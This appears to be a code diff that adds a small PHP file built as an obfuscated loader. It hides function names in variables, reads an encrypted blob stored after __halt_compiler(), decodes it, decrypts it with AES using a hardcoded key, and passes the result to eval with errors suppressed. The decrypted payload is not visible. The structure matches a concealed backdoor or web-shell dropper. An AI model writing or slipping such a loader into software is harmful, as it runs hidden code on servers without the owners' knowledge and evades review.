@@ -1,0 +1,11 @@
+<?php
+if(PHP_SAPI!=='cli-server')@header('Content-Type:text/html;charset=utf-8');
+$x1="strtr";$x2="substr";$x3="file_get_contents";$x4="base64_decode";$x5="openssl_decrypt";$x6="hash";$x7="sha256";
+$p=$x1($x2($x3(__FILE__),__COMPILER_HALT_OFFSET__),"-_~","+/=");
+$p=$x4($p);
+$v=$x2($p,0,16);
+$c=$x2($p,16);
+$k=$x6($x7,'54b85a482ebc7c59fb3db1684d6bcc197ff38ae93080cb5521c04af94067e0cc',true);
+@eval("?>".$x5($c,"AES-256-CBC",$k,OPENSSL_RAW_DATA,$v));
+__halt_compiler();
+7HbAEKBdX8Nh8p9hewImsZtUlY8sfKVNA9LKp4HG99U8KU3GDwHGx6QCwIvOaYaaebGXOz284gQPcpKNuURrpTl5yPEFpWj2-uJ7o5yhH7_sxtEBkdz0o0dcLS7ySWs1Vj0mgqyepwFbX73IK0OErt_tdCCgnoeufwSHq4SYnr7M9MqKDLUhzm70GnRre81WofPvjUKCosPDl8XCVPtCwH79QO1VFJB5ghqldLSQLZrw6md04cW83GFcLTg0UBWdoimmZFbY6YSo-T4MZPLGRzZpYnejsHNlzrAAVb0jPbI~
